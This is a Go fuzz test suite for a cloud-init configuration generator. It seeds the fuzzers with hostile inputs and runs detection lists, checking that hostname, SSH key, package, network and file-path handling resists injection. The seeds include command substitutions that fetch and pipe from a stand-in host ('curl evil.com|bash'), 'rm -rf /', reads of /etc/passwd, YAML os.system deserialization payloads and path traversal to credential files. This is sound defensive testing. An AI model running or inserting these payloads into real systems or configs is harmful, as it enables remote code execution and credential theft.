package cloudinit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
	"gopkg.in/yaml.v3"
)

// FuzzCloudInitConfigSecurity tests CloudInitConfig validation against injection attacks
func FuzzCloudInitConfigSecurity(f *testing.F) {
	// Seed with various configuration scenarios including security issues
	f.Add("test-host", "testuser", "ssh-rsa AAAAB3... user@host", "vim nginx", "eth0")
	f.Add("", "", "", "", "")
	f.Add("host\x00null", "user;rm -rf /", "ssh-rsa $(curl evil.com)", "package1;package2", "eth0")
	f.Add("../../../etc/hostname", "root", "../../.ssh/id_rsa", "malicious-package", "eth0")
	f.Add("host\nFAKE_HOST", "user\ttab", "ssh-rsa\nFAKE_KEY", "pkg1\npkg2", "eth0;ifconfig")
	f.Add("$(hostname)", "${USER}", "`cat /etc/passwd`", "pkg1|pkg2", "eth0")
	f.Add("host.example.com", "user", strings.Repeat("A", 10000), "package", "eth0")
	f.Add("host", "user", "invalid-ssh-key", strings.Repeat("package ", 1000), "eth0")

	f.Fuzz(func(t *testing.T, hostname, username, sshKey, packages, networkIface string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("CloudInitConfig creation panicked with hostname=%q: %v", hostname, r)
			}
		}()

		// Create system info with fuzzed inputs
		sysInfo := &SystemInfo{
			Hostname:          hostname,
			Username:          username,
			SSHPublicKey:      sshKey,
			InstalledPackages: strings.Fields(packages),
			UserGroups:        []string{"sudo", "docker"},
		}

		// Create generator and config from system info
		rc := testutil.TestRuntimeContext(t)
		generator := NewGenerator(rc)
		config, err := generator.GenerateConfig(sysInfo)
		if err != nil {
			t.Logf("GenerateConfig error: %v", err)
			return
		}

		// Validate the config
		validErr := generator.ValidateConfig(config)

		// Check for command injection patterns in all fields
		allFields := hostname + username + sshKey + packages + networkIface
		injectionPatterns := []string{
			";", "&&", "||", "|", "`", "$(", "${",
			"rm -rf", "curl", "wget", "bash -c", "sh -c",
			"eval", "exec", "../", "..\\",
		}

		for _, pattern := range injectionPatterns {
			if strings.Contains(allFields, pattern) {
				t.Logf("Potential command injection pattern '%s' detected", pattern)
				// These patterns should ideally be rejected or sanitized
			}
		}

		// Check for control characters
		controlChars := []string{"\x00", "\n", "\r", "\t"}
		for _, char := range controlChars {
			if strings.Contains(allFields, char) {
				t.Logf("Control character detected in configuration")
			}
		}

		// Test YAML serialization to ensure no injection
		yamlData, yamlErr := yaml.Marshal(config)
		if yamlErr != nil {
			t.Logf("YAML marshal error (could be security feature): %v", yamlErr)
			return
		}

		// Check if dangerous patterns survive YAML encoding
		yamlStr := string(yamlData)
		if strings.Contains(yamlStr, "$(") || strings.Contains(yamlStr, "${") {
			t.Logf("Command substitution pattern found in YAML output")
		}

		// Validate basic requirements
		if validErr == nil {
			// Empty hostname should be invalid
			if hostname == "" && config.Hostname == "" {
				t.Errorf("Empty hostname should be invalid")
			}

			// Empty username should be invalid for user creation
			if username == "" && len(config.Users) > 0 && config.Users[0].Name == "" {
				t.Errorf("Empty username should be invalid")
			}
		}

		// Test for extremely long inputs (DoS)
		if len(hostname) > 1000 || len(username) > 1000 || len(sshKey) > 10000 {
			t.Logf("Testing with extremely long input (DoS scenario)")
		}
	})
}

// FuzzYAMLInjectionSecurity tests YAML generation for injection vulnerabilities
func FuzzYAMLInjectionSecurity(f *testing.F) {
	// Seed with YAML injection attempts
	f.Add("normal", "value")
	f.Add("key", "value: injected")
	f.Add("key", "|\n  - injected: command")
	f.Add("key", "value\n---\nnew_doc: true")
	f.Add("key", "&anchor value")
	f.Add("key", "*reference")
	f.Add("key", "!!python/object/apply:os.system ['echo pwned']")
	f.Add("${key}", "value")
	f.Add("key", "value # comment\ninjected: true")

	f.Fuzz(func(t *testing.T, key, value string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("YAML injection test panicked with key=%q value=%q: %v", key, value, r)
			}
		}()

		// Create a config with the fuzzed values
		config := &CloudInitConfig{
			Hostname: key,
			Users: []UserConf{
				{
					Name:   value,
					Groups: []string{"sudo"},
					Sudo:   "ALL=(ALL) NOPASSWD:ALL",
				},
			},
			WriteFiles: []WriteFile{
				{
					Path:        "/tmp/" + key,
					Content:     value,
					Permissions: "0644",
				},
			},
		}

		// Marshal to YAML
		yamlData, err := yaml.Marshal(config)
		if err != nil {
			t.Logf("YAML marshal error for key=%q value=%q: %v", key, value, err)
			return
		}

		yamlStr := string(yamlData)

		// Check for YAML injection indicators
		dangerousPatterns := []string{
			"!!python",
			"!!ruby",
			"!!perl",
			"&",  // YAML anchors
			"*",  // YAML aliases
			"---", // Document separator
			"...", // Document end
		}

		for _, pattern := range dangerousPatterns {
			if strings.Contains(yamlStr, pattern) && !strings.Contains(key+value, pattern) {
				t.Logf("YAML injection pattern '%s' appeared in output but not in input", pattern)
			}
		}

		// Try to unmarshal back to detect structural changes
		var decoded CloudInitConfig
		if err := yaml.Unmarshal(yamlData, &decoded); err != nil {
			t.Logf("YAML unmarshal error (could indicate injection): %v", err)
		}

		// Verify no additional fields were injected
		if len(decoded.Users) > len(config.Users) {
			t.Errorf("Additional users injected through YAML")
		}

		if len(decoded.WriteFiles) > len(config.WriteFiles) {
			t.Errorf("Additional files injected through YAML")
		}
	})
}

// FuzzPathTraversalSecurity tests file path handling for traversal attacks
func FuzzPathTraversalSecurity(f *testing.F) {
	// Seed with path traversal attempts
	f.Add("/tmp/cloud-init.yaml", "0644")
	f.Add("", "")
	f.Add("../../../etc/passwd", "0666")
	f.Add("/tmp/../etc/shadow", "0777")
	f.Add("./../../root/.ssh/authorized_keys", "0600")
	f.Add("/tmp/test\x00/etc/passwd", "0644")
	f.Add("/tmp/test;touch /tmp/pwned", "0644")
	f.Add("C:\\Windows\\System32\\config\\sam", "0644")
	f.Add("/dev/null", "0644")
	f.Add("/proc/self/environ", "0644")

	f.Fuzz(func(t *testing.T, path, permissions string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Path handling panicked with path=%q: %v", path, r)
			}
		}()

		// Create WriteFile with fuzzed path
		wf := WriteFile{
			Path:        path,
			Content:     "test content",
			Permissions: permissions,
		}

		// Check for path traversal patterns
		if strings.Contains(path, "..") {
			t.Logf("Path traversal attempt detected: %q", path)
		}

		// Check for null bytes (path truncation attack)
		if strings.Contains(path, "\x00") {
			t.Logf("Null byte injection detected in path: %q", path)
		}

		// Check for command injection in path
		shellMetaChars := []string{";", "&", "|", "`", "$(", "${", ">", "<"}
		for _, char := range shellMetaChars {
			if strings.Contains(path, char) {
				t.Logf("Shell metacharacter '%s' detected in path", char)
			}
		}

		// Check for accessing sensitive files
		sensitiveFiles := []string{
			"/etc/passwd", "/etc/shadow", "/etc/sudoers",
			"/.ssh/", "/root/", "/proc/", "/sys/",
			"/dev/", "C:\\Windows\\",
		}

		for _, sensitive := range sensitiveFiles {
			if strings.Contains(path, sensitive) {
				t.Logf("Attempt to access sensitive location: %q", path)
			}
		}

		// Validate permissions format
		if permissions != "" && len(permissions) != 4 {
			t.Logf("Invalid permission format: %q", permissions)
		}

		// Test if path would be created in a safe location
		if path != "" && !strings.HasPrefix(path, "/") && !strings.HasPrefix(path, "./") {
			t.Logf("Relative path without explicit prefix: %q", path)
		}

		// Create a config with the write file
		config := &CloudInitConfig{
			Hostname:   "test-host",
			WriteFiles: []WriteFile{wf},
		}

		// Test YAML generation doesn't introduce issues
		yamlData, err := yaml.Marshal(config)
		if err != nil {
			t.Logf("YAML marshal error with path=%q: %v", path, err)
		} else {
			// Verify path hasn't been modified in YAML
			if !strings.Contains(string(yamlData), path) && path != "" {
				t.Logf("Path was modified during YAML marshaling")
			}
		}
	})
}

// FuzzNetworkConfigSecurity tests network configuration for security issues
func FuzzNetworkConfigSecurity(f *testing.F) {
	// Seed with various network configuration scenarios
	f.Add("eth0", "192.168.1.100", "192.168.1.1", "8.8.8.8,8.8.4.4")
	f.Add("", "", "", "")
	f.Add("eth0;ifconfig", "999.999.999.999", "$(route -n)", "8.8.8.8;nslookup evil.com")
	f.Add("../../../etc/network/interfaces", "192.168.1.100", "192.168.1.1", "8.8.8.8")
	f.Add("eth0\x00eth1", "192.168.1.100\n192.168.1.101", "192.168.1.1", "8.8.8.8")
	f.Add("eth0", "'; DROP TABLE;--", "192.168.1.1", "${DNS_SERVER}")

	f.Fuzz(func(t *testing.T, iface, address, gateway, nameservers string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Network config panicked with iface=%q: %v", iface, r)
			}
		}()

		// Create network config
		netConf := NetworkConf{
			Version: 2,
			Ethernets: map[string]EthConf{
				iface: {
					Addresses:   []string{address},
					Gateway4:    gateway,
					Nameservers: &NSConf{Addresses: strings.Split(nameservers, ",")},
				},
			},
		}

		// Check for command injection in network fields
		allFields := iface + address + gateway + nameservers
		if strings.ContainsAny(allFields, ";|&`$()") {
			t.Logf("Command injection characters detected in network config")
		}

		// Validate interface name
		if iface != "" {
			// Interface names should be alphanumeric with limited special chars
			validIface := true
			for _, char := range iface {
				if !((char >= 'a' && char <= 'z') ||
					(char >= 'A' && char <= 'Z') ||
					(char >= '0' && char <= '9') ||
					char == '-' || char == '_') {
					validIface = false
					break
				}
			}
			if !validIface {
				t.Logf("Invalid interface name: %q", iface)
			}
		}

		// Validate IP addresses
		validateIP := func(ip string, label string) {
			if ip == "" {
				return
			}
			parts := strings.Split(ip, ".")
			if len(parts) != 4 {
				t.Logf("Invalid %s format: %q", label, ip)
				return
			}
			for _, part := range parts {
				// Check for non-numeric
				for _, char := range part {
					if char < '0' || char > '9' {
						t.Logf("Non-numeric character in %s: %q", label, ip)
						return
					}
				}
			}
		}

		validateIP(address, "address")
		validateIP(gateway, "gateway")
		for _, ns := range strings.Split(nameservers, ",") {
			validateIP(strings.TrimSpace(ns), "nameserver")
		}

		// Create full config with network
		config := &CloudInitConfig{
			Hostname: "test-host",
			Network:  netConf,
		}

		// Test YAML generation
		yamlData, err := yaml.Marshal(config)
		if err != nil {
			t.Logf("YAML marshal error with network config: %v", err)
		} else {
			yamlStr := string(yamlData)
			// Check if injection attempts survive
			if strings.Contains(yamlStr, "$(") || strings.Contains(yamlStr, "${") {
				t.Logf("Command substitution survived in YAML")
			}
		}
	})
}

// FuzzSSHKeySecurity tests SSH key handling for security issues
func FuzzSSHKeySecurity(f *testing.F) {
	// Seed with various SSH key scenarios
	f.Add("ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA... user@host")
	f.Add("")
	f.Add("ssh-rsa $(cat /etc/passwd)")
	f.Add("ssh-rsa AAAA... user@host\nssh-rsa BBBB... attacker@evil")
	f.Add("ssh-dss AAAA... user@host")
	f.Add("ecdsa-sha2-nistp256 AAAA... user@host")
	f.Add("ssh-ed25519 AAAA... user@host")
	f.Add("../../.ssh/id_rsa")
	f.Add("ssh-rsa " + strings.Repeat("A", 10000) + " user@host")
	f.Add("ssh-rsa AAAA... user@host;touch /tmp/pwned")
	f.Add("invalid-key-format")

	f.Fuzz(func(t *testing.T, sshKey string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("SSH key handling panicked with key=%q: %v", sshKey, r)
			}
		}()

		// Create user config with SSH key
		userConf := UserConf{
			Name:              "testuser",
			Groups:            []string{"sudo"},
			SSHAuthorizedKeys: []string{sshKey},
		}

		// Check for multiple keys injection (newline attack)
		if strings.Count(sshKey, "\n") > 0 {
			t.Logf("Newline detected in SSH key - potential multiple key injection")
		}

		// Check for command injection
		if strings.ContainsAny(sshKey, ";|&`$()") {
			t.Logf("Command injection characters in SSH key")
		}

		// Check for path traversal (attempting to read key from file)
		if strings.Contains(sshKey, "..") || strings.HasPrefix(sshKey, "/") {
			t.Logf("Path traversal attempt in SSH key: %q", sshKey)
		}

		// Validate SSH key format (basic check)
		validKeyTypes := []string{"ssh-rsa", "ssh-dss", "ecdsa-sha2-nistp256", "ssh-ed25519"}
		hasValidType := false
		for _, keyType := range validKeyTypes {
			if strings.HasPrefix(sshKey, keyType+" ") {
				hasValidType = true
				break
			}
		}

		if sshKey != "" && !hasValidType {
			t.Logf("Invalid SSH key format: %q", sshKey)
		}

		// Check for extremely long keys (DoS)
		if len(sshKey) > 8192 {
			t.Logf("Extremely long SSH key (%d bytes) - potential DoS", len(sshKey))
		}

		// Create config and marshal to YAML
		config := &CloudInitConfig{
			Hostname: "test-host",
			Users:    []UserConf{userConf},
		}

		yamlData, err := yaml.Marshal(config)
		if err != nil {
			t.Logf("YAML marshal error with SSH key: %v", err)
		} else {
			// Verify key is properly escaped in YAML
			yamlStr := string(yamlData)
			if strings.Contains(sshKey, "$") && !strings.Contains(yamlStr, "$") {
				t.Logf("Dollar sign was stripped from SSH key during YAML encoding")
			}
		}
	})
}

// FuzzPackageListSecurity tests package list handling for injection
func FuzzPackageListSecurity(f *testing.F) {
	// Seed with various package list scenarios
	f.Add("vim nginx git")
	f.Add("")
	f.Add("vim;curl evil.com|bash")
	f.Add("package$(whoami)")
	f.Add("valid-package invalid|package")
	f.Add(strings.Repeat("package ", 1000))
	f.Add("package\nmalicious-package")
	f.Add("../../../usr/bin/malware")
	f.Add("package${PATH}")

	f.Fuzz(func(t *testing.T, packages string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Package list handling panicked: %v", r)
			}
		}()

		// Split packages as the code would
		pkgList := strings.Fields(packages)

		// Create config with packages
		config := &CloudInitConfig{
			Hostname: "test-host",
			Packages: pkgList,
		}

		// Check each package for injection attempts
		for _, pkg := range pkgList {
			// Check for shell metacharacters
			if strings.ContainsAny(pkg, ";|&`$(){}[]<>") {
				t.Logf("Shell metacharacter in package name: %q", pkg)
			}

			// Check for path traversal
			if strings.Contains(pkg, "..") || strings.HasPrefix(pkg, "/") {
				t.Logf("Path-like package name: %q", pkg)
			}

			// Check for variable expansion
			if strings.Contains(pkg, "${") || strings.Contains(pkg, "$(") {
				t.Logf("Variable expansion in package name: %q", pkg)
			}

			// Validate package name format (basic)
			validPkg := true
			for _, char := range pkg {
				if !((char >= 'a' && char <= 'z') ||
					(char >= 'A' && char <= 'Z') ||
					(char >= '0' && char <= '9') ||
					char == '-' || char == '.' || char == '_' || char == '+') {
					validPkg = false
					break
				}
			}
			if !validPkg && pkg != "" {
				t.Logf("Invalid package name format: %q", pkg)
			}
		}

		// Check for extremely long package lists (DoS)
		if len(pkgList) > 1000 {
			t.Logf("Extremely long package list: %d packages", len(pkgList))
		}

		// Marshal and check YAML
		yamlData, err := yaml.Marshal(config)
		if err != nil {
			t.Logf("YAML marshal error with packages: %v", err)
		} else {
			yamlStr := string(yamlData)
			// Verify no command injection survives
			if strings.Contains(yamlStr, ";") || strings.Contains(yamlStr, "|") {
				t.Logf("Shell metacharacters survived in YAML package list")
			}
		}
	})
}

// FuzzValidateConfigSecurity tests config validation for security bypasses
func FuzzValidateConfigSecurity(f *testing.F) {
	// Seed with edge cases and malicious configs
	f.Add("", "", 0, 0, false, false)
	f.Add("host", "user", 1, 1, true, true)
	f.Add("a", "b", -1, 100, true, false)
	f.Add(strings.Repeat("A", 1000), strings.Repeat("B", 1000), 1000, 1000, true, true)

	f.Fuzz(func(t *testing.T, hostname, username string, userCount, fileCount int, hasNetwork, hasPackages bool) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("ValidateConfig panicked: %v", r)
			}
		}()

		// Create config with fuzzed parameters
		config := &CloudInitConfig{
			Hostname: hostname,
		}

		// Add users based on count
		for i := 0; i < userCount && i < 100; i++ { // Cap at 100 to prevent DoS
			config.Users = append(config.Users, UserConf{
				Name:   username + string(rune(i)),
				Groups: []string{"sudo"},
			})
		}

		// Add files based on count
		for i := 0; i < fileCount && i < 100; i++ { // Cap at 100
			config.WriteFiles = append(config.WriteFiles, WriteFile{
				Path:    "/tmp/file" + string(rune(i)),
				Content: "content",
			})
		}

		// Add network if requested
		if hasNetwork {
			config.Network = NetworkConf{
				Version: 2,
				Ethernets: map[string]EthConf{
					"eth0": {
						Addresses: []string{"192.168.1.100/24"},
					},
				},
			}
		}

		// Add packages if requested
		if hasPackages {
			config.Packages = []string{"vim", "git"}
		}

		// Validate config
		rc := testutil.TestRuntimeContext(t)
		generator := NewGenerator(rc)
		err := generator.ValidateConfig(config)

		// Check validation results
		if hostname == "" && err == nil {
			t.Errorf("Empty hostname should be invalid")
		}

		// Check for extremely large configs (DoS)
		if userCount > 1000 || fileCount > 1000 {
			t.Logf("Testing with extremely large config: %d users, %d files", userCount, fileCount)
			if err == nil {
				t.Logf("Large config passed validation")
			}
		}

		// Test with negative counts (they get capped at 0)
		if userCount < 0 || fileCount < 0 {
			t.Logf("Testing with negative counts")
		}
	})
}

// FuzzWriteConfigSecurity tests file writing operations for security
func FuzzWriteConfigSecurity(f *testing.F) {
	// Seed with various file paths and contents
	f.Add("/tmp/cloud-init.yaml", "hostname: test")
	f.Add("", "")
	f.Add("../../../etc/cloud-init.yaml", "malicious: true")
	f.Add("/tmp/test\x00.yaml", "content")
	f.Add("/tmp/test;touch /tmp/pwned.yaml", "content")
	f.Add(strings.Repeat("/very/long/path", 100)+".yaml", "content")

	f.Fuzz(func(t *testing.T, filename, content string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("WriteConfig panicked with filename=%q: %v", filename, r)
			}
		}()

		// Create a simple config
		_ = &CloudInitConfig{
			Hostname: "test-host",
		}

		// Check for path traversal
		if strings.Contains(filename, "..") {
			t.Logf("Path traversal attempt in filename: %q", filename)
		}

		// Check for null bytes
		if strings.Contains(filename, "\x00") {
			t.Logf("Null byte in filename: %q", filename)
		}

		// Check for shell metacharacters
		if strings.ContainsAny(filename, ";|&`$()") {
			t.Logf("Shell metacharacters in filename: %q", filename)
		}

		// Check if attempting to write to sensitive locations
		sensitiveLocations := []string{
			"/etc/", "/root/", "/home/", "/usr/", "/bin/",
			"/sbin/", "/var/", "/proc/", "/sys/", "/dev/",
		}

		for _, loc := range sensitiveLocations {
			if strings.HasPrefix(filename, loc) {
				t.Logf("Attempt to write to sensitive location: %q", filename)
			}
		}

		// Check filename length (potential DoS)
		if len(filename) > 4096 {
			t.Logf("Extremely long filename: %d characters", len(filename))
		}

		// For actual write test, use safe temp directory
		if filename != "" && !strings.Contains(filename, "..") && !strings.Contains(filename, "\x00") {
			tempDir := t.TempDir()
			safePath := filepath.Join(tempDir, filepath.Base(filename))

			// Mock a write operation (don't actually write in fuzz test)
			t.Logf("Would write to: %s", safePath)
		}
	})
}

// Helper function to create test files
func createTestCloudInitFile(content string) (string, error) {
	tmpFile, err := os.CreateTemp("", "cloudinit-fuzz-*")
	if err != nil {
		return "", err
	}

	_, err = tmpFile.WriteString(content)
	if err != nil {
		tmpFile.Close()
		os.Remove(tmpFile.Name())
		return "", err
	}

	tmpFile.Close()
	return tmpFile.Name(), nil
}

func removeTestCloudInitFile(path string) {
	os.Remove(path)
}